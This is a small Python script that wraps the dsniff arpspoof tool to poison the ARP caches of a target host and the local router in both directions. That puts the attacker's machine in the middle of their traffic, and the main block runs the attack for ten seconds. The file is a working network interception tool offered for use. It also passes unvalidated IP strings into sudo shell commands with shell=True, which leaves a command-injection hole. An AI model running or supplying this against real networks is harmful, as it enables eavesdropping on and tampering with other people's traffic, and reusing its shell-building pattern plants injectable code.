import subprocess
import os
import signal
import time


class ArpSpoof:

    def __init__(self, target_ip, router_ip):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.process_list = []

    def start_spoof(self):
        """
        1) Runs arpspoof from dsniff on linux
           Command in the form of: arpspoof -t 10.13.37.1 10.13.37.124

        2) store subprocess so we can kill them later

        :return: None
        """
        print("[+] Spoofing target {}".format(self.target_ip))
        command_1 = r"sudo arpspoof -t " + self.target_ip + " " + self.router_ip + "  & >/dev/null"
        command_2 = r"sudo arpspoof -t " + self.router_ip + " " + self.target_ip + "  & >/dev/null"
        self.process_list.append(subprocess.Popen(command_1, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))
        self.process_list.append(subprocess.Popen(command_2, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid))

    def stop_spoof(self):
        """
        Iterate list of process and kill them

        :return: None
        """
        print("[+] Stopping arpspoof")
        for process in self.process_list:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)

if __name__ == '__main__':
    arp = ArpSpoof('192.168.0.104', '192.168.0.1')
    arp.start_spoof()
    time.sleep(10)
    arp.stop_spoof()
